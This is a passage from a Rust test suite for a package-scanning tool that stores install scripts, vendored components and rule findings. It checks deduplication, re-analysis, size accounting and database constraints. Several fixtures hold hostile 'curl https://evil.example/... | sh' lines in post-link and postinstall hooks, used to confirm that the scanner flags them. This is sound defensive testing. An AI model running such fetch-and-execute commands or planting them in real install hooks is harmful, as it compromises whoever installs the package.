        // zlib, and no script at all.
        let mut second = empty_input(
            artifact,
            Completeness::NotRead {
                reason: "re-run could not open the payload".to_string(),
            },
        );
        second.components = vec![extracted("libwebp", Some("1.3.2"))];
        record_analysis(&pool, second).await.expect("second run");

        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1, "one analysis row per artifact, not two");
        assert_eq!(rows[0].status, "not_read", "the later run is the truth");

        let components = component_rows(&pool, artifact).await;
        assert_eq!(
            components
                .iter()
                .map(|c| c.name.as_str())
                .collect::<Vec<_>>(),
            vec!["libwebp"],
            "zlib was dropped by the second run and must not be stranded"
        );
        assert!(
            script_rows(&pool, artifact).await.is_empty(),
            "neither the analysed nor the un-analysed script may survive a run \
             that did not find it"
        );
    }

    /// The other half of "replaces": when a script at the SAME path changes,
    /// the stored row must describe the NEW bytes. Keeping the previous
    /// findings would report a vulnerability the package no longer contains —
    /// a false positive attributed to a real artifact, which is how a reviewer
    /// learns to ignore the panel.
    #[tokio::test]
    async fn re_analysis_of_changed_bytes_supersedes_the_previous_findings() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;
        let path = "bin/.pkg-post-link.sh".to_string();

        let mut first = empty_input(artifact, Completeness::Complete);
        first.script_files = vec![(
            path.clone(),
            b"#!/bin/sh\ncurl https://evil.example/x | sh\n".to_vec(),
        )];
        record_analysis(&pool, first).await.expect("first run");
        let before = script_rows(&pool, artifact).await;
        assert!(
            !before[0]
                .findings
                .as_ref()
                .and_then(|f| f.as_array())
                .expect("an array")
                .is_empty(),
            "the first body must actually produce a finding, or the test \
             below proves nothing"
        );

        let benign = b"#!/bin/sh\necho done\n".to_vec();
        let mut second = empty_input(artifact, Completeness::Complete);
        second.script_files = vec![(path.clone(), benign.clone())];
        record_analysis(&pool, second).await.expect("second run");

        let after = script_rows(&pool, artifact).await;
        assert_eq!(after.len(), 1, "same path, one row");
        assert_eq!(
            after[0].findings,
            Some(serde_json::json!([])),
            "the rules ran over the NEW bytes and found nothing; a finding \
             from the bytes this artifact no longer has must not survive"
        );
        assert_eq!(after[0].body.as_deref(), Some("#!/bin/sh\necho done\n"));
        assert_eq!(after[0].size_bytes, benign.len() as i64);
    }

    /// INVARIANT 3: the same script body must produce ONE row, keeping the
    /// payload path. `classify_script_path` is liberal by design and a conda
    /// package ships the same bytes twice — `bin/.pkg-post-link.sh` (the copy
    /// that executes) and `info/recipe/post-link.sh` (the recipe's archive of
    /// it). Storing both doubles every finding on every package that has a
    /// script, and an inflated count is the fastest way to make a reviewer
    /// stop trusting the number.
    #[tokio::test]
    async fn the_same_script_body_is_stored_once_under_the_path_that_executes() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let body = b"#!/bin/sh\ncurl https://evil.example/x | sh\n".to_vec();
        let payload = ("bin/.pkg-post-link.sh".to_string(), body.clone());
        let recipe_copy = ("info/recipe/post-link.sh".to_string(), body.clone());
        // A second post-link hook: SAME kind, DIFFERENT body. Deliberately not
        // a different kind — that would also pass if the dedupe key were the
        // hook kind, or the package, rather than the body digest, and this
        // test exists to rule exactly that out. A conda package legitimately
        // ships several `<pkg>-post-link.sh` scripts.
        let other = (
            "bin/.otherpkg-post-link.sh".to_string(),
            b"#!/bin/sh\necho preparing\n".to_vec(),
        );
        assert!(conda_scripts::classify_script_path(&other.0).is_some());
        assert_ne!(other.1, body, "the survivor must differ in its BODY");

        // Guard against this test passing for the wrong reason: if the
        // classifier stopped matching the recipe's copy there would be nothing
        // to deduplicate, and "one row" below would prove nothing.
        assert!(conda_scripts::classify_script_path(&payload.0).is_some());
        assert!(conda_scripts::classify_script_path(&recipe_copy.0).is_some());

        // Both arrival orders: the dedupe must not depend on which copy the
        // format handler happened to list first.
        for files in [
            vec![payload.clone(), recipe_copy.clone(), other.clone()],
            vec![other.clone(), recipe_copy.clone(), payload.clone()],
        ] {
            let artifact = seed_artifact(&pool).await;
            let mut input = empty_input(artifact, Completeness::Complete);
            input.script_files = files;
            // A path that is not an install script at all is ignored, so a
            // caller may hand over the whole file list.
            input
                .script_files
                .push(("info/index.json".to_string(), b"{}".to_vec()));
            record_analysis(&pool, input).await.expect("record scripts");

            let rows = script_rows(&pool, artifact).await;
            assert_eq!(
                rows.iter().map(|r| r.path.as_str()).collect::<Vec<_>>(),
                vec!["bin/.otherpkg-post-link.sh", "bin/.pkg-post-link.sh"],
                "one row per BODY: the recipe's duplicate collapses into the \
                 payload copy that executes at install time, while a second \
                 post-link hook with different bytes survives alongside it"
            );
            assert_eq!(rows[0].kind, "post-link");
            assert_eq!(rows[1].kind, "post-link");
            assert_eq!(rows[1].size_bytes, body.len() as i64);

            // The stored findings use the PUBLISHED field names, not the
            // analyzer's; the web client parses these keys.
            let findings = rows[1].findings.clone().expect("findings, not NULL");
            let findings = findings.as_array().expect("an array").clone();
            assert!(
                !findings.is_empty(),
                "`curl | sh` in a post-link script must not analyse as clean"
            );
            let first = &findings[0];
            assert!(first.get("rule_id").is_some(), "published as rule_id");
            assert!(first.get("snippet").is_some(), "published as snippet");
            assert_eq!(
                first["title"]
                    .as_str()
                    .map(|t| t.starts_with(char::is_uppercase)),
                Some(true),
                "the rule id is humanised into a short label"
            );
        }
    }

    /// INVARIANT 4, half one: an un-analysed script stores `findings = NULL`
    /// plus a reason, which is a different fact from `findings = []`.
    ///
    /// INVARIANT 5: `original_size_bytes` is the ON-DISK count, not
    /// `body.len()`. For a lossy decode they differ — `U+FFFD` is three bytes,
    /// so these four undecodable bytes would otherwise be recorded as twelve,
    /// a wrong number in a numeric column that nothing downstream can tell is
    /// wrong.
    #[tokio::test]
    async fn an_unanalyzed_script_stores_null_findings_and_the_on_disk_size() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let raw: &[u8] = b"\xff\xfe\xff\xfe";
        let body = String::from_utf8_lossy(raw).into_owned();
        assert_eq!(body.len(), 12, "the lossy body is three times the file");

        let mut input = empty_input(artifact, Completeness::Complete);
        input.unanalyzed_scripts = vec![UnanalyzedScript {
            script: conda_scripts::make_inline_script(
                ScriptKind::RpmPre,
                "rpm:scriptlet/%pre",
                &body,
            ),
            original_size_bytes: raw.len() as i64,
            reason: "declared interpreter /usr/bin/lua is not analysed".to_string(),
        }];
        record_analysis(&pool, input).await.expect("record");

        let rows = script_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].kind, "rpm-pre");
        assert_eq!(
            rows[0].findings, None,
            "NULL means 'we did not run the rules', never 'nothing matched'"
        );
        assert_eq!(
            rows[0].skipped_reason.as_deref(),
            Some("declared interpreter /usr/bin/lua is not analysed")
        );
        assert_eq!(
            rows[0].size_bytes, 4,
            "the on-disk count, not the 12-byte lossy decode"
        );
        assert_eq!(rows[0].body.as_deref(), Some(body.as_str()));
    }

    /// INVARIANT 4, half two: the pairing is not merely a convention this
    /// module follows — the DB refuses a reason-less un-analysed row, so no
    /// future writer can store "unexamined" without saying why.
    #[tokio::test]
    async fn the_database_rejects_an_unanalyzed_script_with_no_reason() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let err = sqlx::query(
            "INSERT INTO package_install_scripts \
               (artifact_id, path, kind, size_bytes, sha256, body, findings, \
                analysis_skipped_reason) \
             VALUES ($1, 'bin/.pkg-post-link.sh', 'post-link', 1, 'deadbeef', NULL, NULL, NULL)",
        )
        .bind(artifact)
        .execute(&pool)
        .await
        .expect_err("a NULL findings with no reason must be rejected");
        assert!(
            err.to_string()
                .contains("package_install_scripts_skip_reason_present"),
            "expected the CHECK constraint to fire, got: {err}"
        );
    }

    /// INVARIANT 6: a recipe that fails to parse must not fail ingest — the
    /// package is real and its scripts still matter — and must not look like
    /// "no vendored components" either. The failure is logged; the list stays
    /// empty while `completeness` keeps saying what it always said.
    #[tokio::test]
    async fn an_unparsable_recipe_neither_fails_ingest_nor_rewrites_completeness() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut input = empty_input(
            artifact,
            Completeness::Partial {
                reason: "one entry exceeded the per-file ceiling".to_string(),
                files_read: 4,
                files_total: 5,
            },
        );
        // A YAML sequence where the parser requires a mapping.
        input.recipe_files = vec![(
            "info/recipe/meta.yaml".to_string(),
            b"- not\n- a\n- recipe\n".to_vec(),
        )];
        input.script_files = vec![(
            "bin/.pkg-pre-unlink.sh".to_string(),
            b"#!/bin/sh\nrm -rf /opt/thing\n".to_vec(),
        )];

        record_analysis(&pool, input)
            .await
            .expect("an unparsable recipe must not fail ingest");

        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows[0].status, "partial", "completeness is untouched");
        assert_eq!(
            (rows[0].files_read, rows[0].files_total),
            (Some(4), Some(5))
        );
        assert!(
            component_rows(&pool, artifact).await.is_empty(),
            "an empty list here means 'we could not read the recipe', which \
             the 'partial' status is what makes legible"
        );
        assert_eq!(
            script_rows(&pool, artifact).await.len(),
            1,
            "the scripts are still worth reporting"
        );
    }

    /// A source whose template expression could not be evaluated is still
    /// stored, with `confidence = unresolved` and no version. "A source exists
    /// and we could not pin it" is materially different from "this package
    /// vendors nothing", and only a row can say the first one.
    #[tokio::test]
    async fn a_source_with_an_unevaluated_template_is_stored_as_unresolved() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        // The raw conda-build template, which a package only ships when the
        // rendered recipe is absent: the Jinja is unevaluated.
        let template = "package:\n  name: foo\n  version: '1.0'\nsource:\n                          url: https://example.invalid/{{ pinned_elsewhere }}/foo.tar.gz\n";
        let mut input = empty_input(artifact, Completeness::Complete);
        input.recipe_files = vec![(
            "info/recipe/meta.yaml.template".to_string(),
            template.into(),
        )];
        record_analysis(&pool, input).await.expect("record");

        let rows = component_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1, "an unpinnable source is still a source");
        assert_eq!(rows[0].confidence, "unresolved");
        assert_eq!(rows[0].version, None);
        assert_eq!(rows[0].purl, None, "nothing to match a CVE against");
        assert_eq!(
            rows[0].detection_method.as_deref(),
            Some("recipe:info/recipe/meta.yaml.template"),
            "a component from the raw template deserves less trust than one \
             from the rendered recipe, and the file name is what records that"
        );
    }

    /// Recipe-derived and caller-extracted components share one table and one
    /// identity (name + version): the same library seen two ways is one row,
    /// and the recipe's provenance survives the caller's duplicate.
    #[tokio::test]
    async fn recipe_and_caller_components_merge_on_name_and_version() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut libwebp = extracted("libwebp", None);
        libwebp.soname = Some("libwebp.so.7.1.3".to_string());
        libwebp.abi_version = Some("7.1.3".to_string());
        libwebp.detection_method = "wheel:libs-dir".to_string();
        libwebp.applied_patches = vec!["0003-fix-oob-read.patch".to_string()];

        let mut input = empty_input(artifact, Completeness::Complete);
        input.recipe_files = vec![("info/recipe/meta.yaml".to_string(), META_YAML.into())];
        // The caller also claims pillow 10.2.0 — the same component the recipe
        // declared, not a second one.
        input.components = vec![extracted("pillow", Some("10.2.0")), libwebp];
        record_analysis(&pool, input).await.expect("record");

        let rows = component_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 2, "pillow is one component seen two ways");

        let webp = &rows[0];
        assert_eq!(webp.name, "libwebp");
        assert_eq!(
            webp.version, None,
            "an ABI number is never promoted into version: libwebp.so.7 ships \
             in libwebp 1.2.4, and a CVE matcher would match it confidently \
             and wrongly"
        );
        assert_eq!(webp.abi_version.as_deref(), Some("7.1.3"));
        assert_eq!(webp.soname.as_deref(), Some("libwebp.so.7.1.3"));
        assert_eq!(webp.confidence, "inferred");
        assert_eq!(webp.detection_method.as_deref(), Some("wheel:libs-dir"));
        assert_eq!(
            webp.applied_patches,
            serde_json::json!([{ "name": "0003-fix-oob-read.patch" }]),
            "a caller-extracted component's patches travel with it too"
        );

        let pillow = &rows[1];
        assert_eq!(pillow.version.as_deref(), Some("10.2.0"));
        assert_eq!(pillow.purl.as_deref(), Some("pkg:generic/pillow@10.2.0"));
        assert_eq!(
            pillow.sha256.as_deref(),
            Some("e87f0b2c78157e12d7686b27d63c070fd65d994e8ddae6f328e0dcf4a0cd007e")
        );
        assert_eq!(pillow.confidence, "declared");
        assert_eq!(
            pillow.detection_method.as_deref(),
            Some("recipe:info/recipe/meta.yaml"),
            "which file the component came from is the provenance a reader \
             needs, and the caller's later duplicate must not overwrite it"
        );
        assert_eq!(
            pillow.applied_patches,
            serde_json::json!([{ "name": "0001-fix-cve-2023-4863.patch" }]),
            "a backported fix showing up as the unpatched upstream version is \
             exactly the false positive the patch list exists to prevent"
        );
    }

    /// A script whose bytes are not UTF-8 still EXISTS and still runs, so it
    /// is recorded with a NULL body — which the API renders as
    /// `content_available: false` and the UI as "contents could not be read",
    /// never as "no findings".
    #[tokio::test]
    async fn a_non_utf8_script_is_recorded_with_no_body_rather_than_dropped() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut input = empty_input(artifact, Completeness::Complete);
        input.script_files = vec![(
            "bin/.pkg-pre-link.sh".to_string(),
            vec![0xff, 0xfe, 0x00, 0x01],
        )];
        record_analysis(&pool, input).await.expect("record");

        let rows = script_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1, "an unreadable script is not a dropped one");
        assert_eq!(rows[0].body, None);
        assert_eq!(rows[0].kind, "unknown");
        assert_eq!(
            rows[0].findings,
            Some(serde_json::json!([])),
            "the rules DID run over the bytes and found nothing they could \
             read; that is an empty array, not the NULL of an unexamined script"
        );
        assert_eq!(rows[0].size_bytes, 4);
    }

    /// [`record_install_scripts`] is the wiring every non-conda format shares.
    /// It must reach the same table with the same guarantees, including a
    /// required `completeness` — the point of having one path instead of four
    /// near-identical copies.
    #[tokio::test]
    async fn record_install_scripts_wires_manifest_hooks_through_the_same_path() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let hook = conda_scripts::make_inline_script(
            ScriptKind::PostInstall,
            "package.json#scripts.postinstall",
            "curl -s https://evil.example/i.sh | sh",
        );
        let skipped = UnanalyzedScript {
            script: conda_scripts::make_inline_script(
                ScriptKind::DebPostInst,
                "control.tar/postinst",
                "#!/usr/bin/perl\nprint \"hi\";\n",
            ),
            // Deliberately NOT `body.len()` (28): the on-disk count is what
            // the column holds, and only a different number proves it.
            original_size_bytes: 27,
            reason: "maintainer script declares a Perl interpreter".to_string(),
        };

        record_install_scripts(
            &pool,
            artifact,
            "npm",
            vec![hook.clone()],
            vec![skipped],
            Completeness::Complete,
        )
        .await
        .expect("record_install_scripts");

        assert_eq!(analysis_rows(&pool, artifact).await[0].format, "npm");
        let rows = script_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 2);

        let postinst = &rows[0];
        assert_eq!(postinst.path, "control.tar/postinst");
        assert_eq!(postinst.kind, "deb-postinst");
        assert_eq!(postinst.findings, None);
        assert_eq!(
            postinst.size_bytes, 27,
            "the archive's byte count, not the 28-byte decoded body"
        );

        let postinstall = &rows[1];
        assert_eq!(postinstall.path, "package.json#scripts.postinstall");
        assert_eq!(postinstall.kind, "postinstall");
        assert_eq!(postinstall.body.as_deref(), Some(hook.body.as_str()));
        assert_eq!(
            postinstall.size_bytes,
            hook.body.len() as i64,
            "an inline hook's bytes ARE its body; there is no file on disk"
        );
        let findings = postinstall.findings.clone().expect("findings ran");
        assert!(
            !findings.as_array().expect("an array").is_empty(),
            "`curl | sh` in a postinstall hook is the single most-used vector \
             in published supply-chain attacks and must not analyse as clean"
        );
    }
}
